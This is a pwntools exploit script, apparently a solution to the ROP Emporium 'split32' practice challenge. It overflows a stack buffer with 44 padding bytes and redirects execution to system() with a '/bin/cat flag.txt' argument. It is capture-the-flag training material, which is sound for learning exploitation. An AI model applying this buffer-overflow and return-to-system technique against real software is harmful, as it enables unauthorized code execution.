#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./split32')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("> ")

payload = (
    b"A" * 44 +
    p32(exe.plt["system"]) +
    b"BBBB" +
    p32(0x804a030) # /bin/cat flag.txt
)
io.sendline(payload)

io.interactive()

